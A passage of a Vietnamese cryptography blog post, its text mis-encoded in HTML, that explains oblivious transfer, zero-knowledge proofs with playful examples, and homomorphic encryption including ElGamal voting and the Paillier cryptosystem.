<p>Rá»“i Mao chuyá»ƒn láº¡i cáº·p <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_dbdce35eb2f44b7d782b3408c9661212.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> Ä‘á»ƒ cho MaiAnh tÃ­nh ra <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_d9094fb8cc52a45fb6338a51d0b15d53.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. NhÆ° váº­y, Mao khÃ´ng Ä‘á»ƒ lá»™ cáº£ 2Â giÃ¡ trá»‹Â <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, trong khi MaiAnh khÃ´ng Ä‘á»ƒ lá»™ <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_03c7c0ace395d80182db07ae2c30f034.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:2px;' class='tex' alt="" data-recalc-dims="1" /></span> mÃ  váº«n láº¥y Ä‘Æ°á»£c <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a727b3abb09c0ecf8898343a5bbeffb1.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> vá». Mao cÅ©ng khÃ´ng biáº¿t Ä‘Æ°á»£c MaiAnh Ä‘Ã£ láº¥y sá»‘ nÃ o vá» mÃ  chá»‰ biáº¿t MaiAnh Ä‘Ã£ láº¥y Ä‘Æ°á»£c 1 sá»‘. TÃ³m táº¯t láº¡i trong hÃ¬nh nhÆ° sau:</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?ssl=1"><img data-attachment-id="563" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" data-orig-size="389,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" class="aligncenter wp-image-563 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=389%2C187&#038;ssl=1" alt="Untitled" width="389" height="187" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?w=389&amp;ssl=1 389w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=300%2C144&amp;ssl=1 300w" sizes="(max-width: 389px) 100vw, 389px" data-recalc-dims="1" /></a></p>
<p>CÃ¢u há»i Ä‘áº·t ra OT sáº½ Ä‘Æ°á»£c Ã¡p dá»¥ng nhÆ° tháº¿ nÃ o, vÃ­ dá»¥ anh MÃ­ch Ä‘ang lÃ m há»‡ thá»‘ng e-Health sá»©c khá»e y táº¿ Ä‘iá»‡n tá»­. VÃ¬ anh lÃ  bÃªn thá»© 3 lÃ m tin há»c nÃªn táº¥t nhiÃªn anh khÃ´ng Ä‘Æ°á»£c Ã´ng quan thanh liÃªm nÃ o cho tiáº¿p cáº­n vÃ o há»“ sÆ¡ y táº¿ cá»§a bá»‡nh nhÃ¢n. Do Ä‘Ã³ anh quyáº¿t Ä‘á»‹nh kÃ½ há»£p Ä‘á»“ng vá»›i bá»‡nh viá»‡n sá»­ dá»¥ng OT Ä‘á»ƒ lÃ m API truy cáº­p thÃ´ng tin. LÃºc nÃ y anh lÃ m demo nÃªn cÆ¡ sá»Ÿ dá»¯ liá»‡u má»›i cÃ³ thÃ´ng tin HIV cá»§a 2 bá»‡nh nhÃ¢n lÆ°u dÆ°á»›i dáº¡ng dÆ°Æ¡ng tÃ­nh (1) vÃ  Ã¢m tÃ­nh (0). Ãp dá»¥ng OTP anh MÃ­ch Ä‘Ã£ cÃ³ thá»ƒ biáº¿t tráº¡ng thÃ¡i HIV cá»§a 1 trong 2 bá»‡nh nhÃ¢n mÃ  bá»‡nh viÃªn khÃ´ng biáº¿t anh Ä‘Ã£ query bá»‡nh nhÃ¢n nÃ o.</p>
<p><strong>3.ZKP</strong></p>
<p>Bá»‡nh cáº¡nh viá»‡c dÃ¹ng OT Ä‘á»ƒ chia sáº» khÃ´ng lá»™ thÃ´ng tin, ngÆ°á»i ta cÃ²n nghÄ© ra nhiá»u trÃ² phá»©c táº¡p khÃ¡c dÆ°á»›i cÃ¡i tÃªn <strong>ZKP (Zero Knowledge Proof)</strong>Â Ä‘iá»ƒn hÃ¬nh lÃ Â bÃ i toÃ¡n lÃªn bar cá»§a chá»¥y MÃ­ch Ä‘Æ°á»£c trÃ¬nh bÃ y nhÆ° sau: Trong má»™t láº§n trÃªnÂ bar hÆ¡i muá»™n vÃ o khoáº£ngÂ 2 giá» sÃ¡ng thÃ¬ cÃ¡c anh pokemon áº­p vÃ o Ä‘Ã²i kiá»ƒm tra hÃ nh chÃ­nh vá»›i lÃ½ do trÃªn 18 tuá»•i má»›i Ä‘Æ°á»£c ngá»“i bar hÃºt thuá»‘c bÃº diá»‡u nhÆ° má»™t sá»‘ hoa háº­u nÃ o Ä‘Ã³. Vá»‘n lÃ  má»™t ngÆ°á»i tÃ´n trá»ng quyá»n con ngÆ°á»i chá»¥y khÃ´ng muá»‘n ai phÃ¡n xÃ©t vÃ¬ hÃºt thuá»‘c lÃ¡ lÃ  quyá»n tá»± do cá»§a má»—i ngÆ°á»i. Chá»¥yÂ chÃ¢n thÃ nh chÃºc má»«ng báº¡n chá»¥yÂ náº¿u emÂ bá» Ä‘Æ°á»£c thuá»‘c, cÃ²n khÃ´ng emÂ cÅ©ng Ä‘á»«ng buá»“n vÃ¬ sau má»™t thá»i gian nghá»‰, Ä‘iáº¿u thuá»‘c sáº¯p tá»›i emÂ hÃºt Ä‘áº£m báº£o nÃ³ sáº½ ngon khÃ´ng bÃºt nÃ o táº£ xiáº¿t.Â NgoÃ i ra láº¡i vá»‘n lÃ  má»™t ngÆ°á»i tÃ´n trá»ng quyá»n con ngÆ°á»i chá»¥y cÅ©ngÂ khÃ´ng muá»‘n Ä‘á»ƒ lá»™ liá»…u ngÃ y sinh nháº­t cá»§a mÃ¬nh giá»¯a chá»‘n Ä‘Ã´ng ngÆ°á»i. Thay vÃ¬ trÃ¬nh ID CMND hay báº±ng lÃ¡i chá»¥y Ä‘Ã£ show tháº» ngÃ¢n hÃ ng cá»§a mÃ¬nh Ä‘á»ƒ quáº¹t bill cho cÃ¡c anh xem. Vá»›i luáº­t trÃªn 18 tuá»•i má»›i Ä‘Æ°á»£c lÃ m credit card nÃªn máº·c nhiÃªn chá»¥y Ä‘Ã£ chá»©ng minh mÃ¬nh Ä‘Ã£ trÃªn 18 tuá»•i mÃ  khÃ´ng Ä‘á»ƒ lá»™ ngÃ y sinh cá»§a mÃ¬nh <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>.</p>
<p>Má»™t vÃ­ dá»¥ ZKP thá»© 2 Ä‘Ã³ lÃ  vÃ­ dá»¥ hang Ä‘á»™ng cá»§a AliBaBa:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?ssl=1"><img data-attachment-id="567" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-orig-size="277,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" class="size-full wp-image-567 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?resize=277%2C187&#038;ssl=1" alt="Untitled" width="277" height="187" data-recalc-dims="1" /></a></p>
<p>NhiÂ tuyÃªn bá»‘ ráº±ng cÃ´ biáº¿t máº­t mÃ£ Ä‘á»ƒ má»Ÿ cá»­a hang. LÃ­pÂ há»i cÃ´ pháº£iÂ chá»©ng minh tuyÃªn bá»‘ cá»§a mÃ¬nh. NhÆ°ng NhiÂ khÃ´ng thá»ƒ nÃ³i máº­t kháº©uÂ cho LÃ­p vÃ¬ nhÆ° váº­y tháº­t lÃ  lá»™ liá»…uÂ <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>. Do Ä‘Ã³ chá»¥y MÃ­ch Ä‘Ã£ chá»‰ cho Nhi má»™t cÃ¡ch nhÆ° sau:</p>
<ul>
<li>LÃ­p Ä‘á»©ng quay máº·t tá»¥t quáº§n á»Ÿ má»™t khoáº£ng cÃ¡ch khÃ¡ xa vÃ  chá»Â NhiÂ bÆ°á»›c vÃ o hang.<br />
Sau Ä‘Ã³, LÃ­p Ä‘áº¿n cá»­a hangÂ rÃµ rÃ ngÂ anh ta khÃ´ng biáº¿t Nhi Ä‘Ã£ Ä‘i sang bÃªn nÃ o.</li>
<li>LÃ­p tÃ¹y Ã½ hÃ©t lÃªn yÃªu cáº§uÂ Nhi bÆ°á»›c raÂ tá»« bÃªn trÃ¡i hoáº·c bÃªn pháº£i.</li>
<li>Hai Ä‘á»©aÂ láº·p láº¡i trÃ² chÆ¡i nÃ y cho Ä‘áº¿nÂ khi LÃ­p bá»‹Â thuyáº¿t phá»¥c hoáº·c Nhi chÃ¡n khÃ´ng chÆ¡i ná»¯a.</li>
</ul>
<p>RÃµ rÃ ng náº¿u Nhi Ä‘Ã£ á»Ÿ phÃ­a bÃªn trÃ¡i vÃ  LÃ­p yÃªu cáº§uÂ cÃ´ áº¥y Ä‘áº¿n tá»« bÃªn trÃ¡i thÃ¬ quáº£ nÃ yÂ NhiÂ Ä‘Ã£ may máº¯n <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. Náº¿u khÃ´ng, Nhi chá»‰ cÃ³ thá»ƒ Ä‘áº¿nÂ tá»« bÃªn trÃ¡i náº¿u cÃ´ áº¥y biáº¿t máº­t mÃ£ Ä‘á»ƒ má»Ÿ cá»­a hang pháº£i khÃ´ng nÃ o (!?).</p>
<p><strong>4.Há»‡ máº­t Ä‘á»“ng cáº¥u( Homomorphic cryptosystem)</strong></p>
<p>Äá»ƒ tiáº¿p tá»¥c lÃ  cuá»™c chÆ¡i thÃªm pháº§n phá»©c táº¡p, cÃ¡c nhÃ  máº­t mÃ£ há»c láº¡i tiáº¿p tá»¥c nghÄ© ra Há»‡ máº­t Ä‘á»“ng cáº¥u Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a:</p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?ssl=1"><img data-attachment-id="570" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" data-orig-size="463,159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=300%2C103&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" class="aligncenter wp-image-570 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=463%2C159&#038;ssl=1" alt="Untitled" width="463" height="159" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?w=463&amp;ssl=1 463w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=300%2C103&amp;ssl=1 300w" sizes="(max-width: 463px) 100vw, 463px" data-recalc-dims="1" /></a></p>
<p>Há»‡ mÃ£ hoÃ¡ Elgamal cÃ³ tÃ­nh cháº¥t Ä‘á»“ng cáº¥u, nhá» nÃ³ cÃ³ thá»ƒ tÃ­nh Ä‘Æ°á»£c káº¿t quáº£ trong cuá»™c bá» phiáº¿u â€œchá»n má»™t trong haiâ€, mÃ  khÃ´ng cáº§n giáº£i mÃ£ tá»«ng lÃ¡ phiáº¿u. SÆ¡ Ä‘á»“ chia sáº» bÃ­ máº­t Shamir phá»‘i há»£p vá»›i há»‡ mÃ£ hoÃ¡ Elgamal cÃ²n cÃ³ tÃ­nh cháº¥t Ä‘áº·c biá»‡t hÆ¡n ná»¯a, nhá» nÃ³ cÃ³ thá»ƒ chia lÃ¡ phiáº¿u thÃ nh nhiá»u máº£nh, cá»­ tri gá»­i má»—i máº£nh cho má»™t thÃ nh viÃªn ban kiá»ƒm phiáº¿u, khi khá»›p cÃ¡c máº£nh phiáº¿u láº¡i sáº½ Ä‘Æ°á»£c ná»™i dung Ä‘áº§y Ä‘á»§ cá»§a lÃ¡ phiáº¿u. BÃ i bÃ¡o nÃ y trÃ¬nh bÃ y cÃ¡c tÃ­nh cháº¥t trÃªn vÃ  chá»‰ ra á»©ng dá»¥ng cá»§a chÃºng trong bá» phiáº¿u tá»« xa.Há»‡ mÃ£ hoÃ¡ Elgamal cÃ³ tÃ­nh cháº¥t Ä‘á»“ng cáº¥u, nhá» nÃ³ cÃ³ thá»ƒ tÃ­nh Ä‘Æ°á»£c káº¿t quáº£ trong cuá»™c bá» phiáº¿u â€œchá»n má»™t trong haiâ€, mÃ  khÃ´ng cáº§n giáº£i mÃ£ tá»«ng lÃ¡ phiáº¿u. SÆ¡ Ä‘á»“ chia sáº» bÃ­ máº­t Shamir phá»‘i há»£p vá»›i há»‡ mÃ£ hoÃ¡ Elgamal cÃ²n cÃ³ tÃ­nh cháº¥t Ä‘áº·c biá»‡t hÆ¡n ná»¯a, nhá» nÃ³ cÃ³ thá»ƒ chia lÃ¡ phiáº¿u thÃ nh nhiá»u máº£nh, cá»­ tri gá»­i má»—i máº£nh cho má»™t thÃ nh viÃªn ban kiá»ƒm phiáº¿u, khi khá»›p cÃ¡c máº£nh phiáº¿u láº¡i sáº½ Ä‘Æ°á»£c ná»™i dung Ä‘áº§y Ä‘á»§ cá»§a lÃ¡ phiáº¿u. (ref2 Trá»‹nh Nháº­t Tiáº¿n, Äáº·ng Thu Hiá»n, TrÆ°Æ¡ng Thá»‹ Thu Hiá»n, LÆ°Æ¡ng Viá»‡t NguyÃªn)</p>
<p class="">Äá»ƒ rÃµ thÃªm vá» váº¥n Ä‘á» nÃ y, báº¡n Ä‘á»c cÃ³ thá»ƒ xem láº¡i bÃ iÂ <a href="https://babyphd.net/2016/03/introduction-to-threshold-signature-scheme/">Introduction to Threshold signature scheme</a>. LÆ°u Ã½Â Elgamal cÃ³ tÃ­nh cháº¥t Ä‘á»“ng cáº¥u cÃ²n RSA thÃ¬ khÃ´ng nhÃ© <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>.Â á» khuÃ´n khá»• bÃ i viáº¿t nÃ y chá»‰ trÃ¬nh bÃ y thÃªm vá» há»‡ mÃ£ Paillier cÃ´ng bá»‘ nÄƒm 1999 nhÆ° sau:</p>
<p class="">Giáº£ sá»­Â n = pq vÃ Â g lÃ  má»™t pháº§n tá»­ Ä‘áº·c biáº¿t cá»§a <a href="https://vi.wikipedia.org/wiki/Nh%C3%B3m_(to%C3%A1n_h%E1%BB%8Dc)#Nh.C3.B3m_xiclic">nhÃ³m cyclic</a>Â Z dá»±a theo lÅ©y thá»«a n sao cho <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_5c6997547b6627b1b35a5ce698c5a298.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. KhÃ³a bÃ­ máº­tÂ <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b41b9dd23fcbbf9d222a2b66fd285d85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, khÃ³a cÃ´ng khaiÂ (g, n). Vá»›i plaintext lÃ  thÃ´ng Ä‘iá»‡p <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b35275cb2846fd1f47f7772df7bb08fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> vÃ  má»™t sá»‘ r nguyÃªn dÆ°Æ¡ng ngáº«u nhiÃªn thÃ¬ hÃ m mÃ£ hÃ³a Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a:<br />
<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ce9d9741c5d2c87fc79319bb44b3fb85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
<p class="">LÆ°u Ã½ lcm = least common multiple Æ°á»›c chung nhá» nháº¥t. VÃ  ngÆ°á»i ta thÆ°á»ng chá»n g=n+1 Ä‘á»ƒ thá»a mÃ£n tÃ­nh cháº¥t generator nhÆ° sau:</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?ssl=1"><img data-attachment-id="576" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" data-orig-size="384,169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=300%2C132&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" class="aligncenter wp-image-576 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=384%2C169&#038;ssl=1" alt="Untitled" width="384" height="169" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?w=384&amp;ssl=1 384w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=300%2C132&amp;ssl=1 300w" sizes="(max-width: 384px) 100vw, 384px" data-recalc-dims="1" /></a></p>
<p class="">CÃ²n quÃ¡ trÃ¬nh giáº£i mÃ£ thÃ¬ phá»©c táº¡p hÆ¡n chÃºt, Ä‘Ã³ lÃ :</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?ssl=1"><img data-attachment-id="577" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-7/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=823%2C410&amp;ssl=1" data-orig-size="823,410" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=604%2C301&amp;ssl=1" class="alignnone wp-image-577 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=542%2C270&#038;ssl=1" alt="Untitled" width="542" height="270" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?w=823&amp;ssl=1 823w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=768%2C383&amp;ssl=1 768w" sizes="(max-width: 542px) 100vw, 542px" data-recalc-dims="1" /></a></p>
<p class="">Váº­y táº¡i sao cÃ³ RSA phá»• cáº­p nÃ´ng thÃ´n Ä‘Ã£ cháº¥t chÆ¡i ngÆ°á»i dÆ¡i rá»“i, cÃ¡c nhÃ  máº­t mÃ£ há»c láº¡i pháº£i nghÄ© ra há»‡ máº­t oÃ¡i Äƒm nÃ y <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. áº¤y lÃ  vÃ¬ á»Ÿ Ä‘Ã¢y ta cÃ³ random r, má»—i láº§n mÃ£ hÃ³a láº¡i cÃ³ ciphertext khÃ¡c nhau. NgoÃ i ra vá»›i má»—i ciphertext náº¿u khÃ´ng biáº¿t random r thÃ¬ láº¡iÂ ra vÃ´ sá»‘ message m thá»a khÃ¡c nhau. NgoÃ i ra vá»›i tÃ­nh cháº¥t Ä‘á»“ng cáº¥u giÃºp cho phÃ©p cá»™ng (+) vÃ  lÅ©y thá»«a (^) ta cÃ³ thá»ƒ thiáº¿t káº¿ cÃ¡c giao thá»©c mÃ£ hÃ³a gá»­i Ä‘i ciphertext Ä‘á»ƒ má»™t bÃªn thá»© ba tÃ­nh toÃ¡n, bÃªn tÃ­nh toÃ¡n nÃ y chá»‰ tráº£ vá» káº¿t quáº£ phÃ©p tÃ­nh mÃ  khÃ´ng biáº¿t giÃ¡ trá»‹ mÃ  bÃªn cáº§n tÃ­nh Ä‘Æ°a ra lÃ  gÃ¬Â <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" 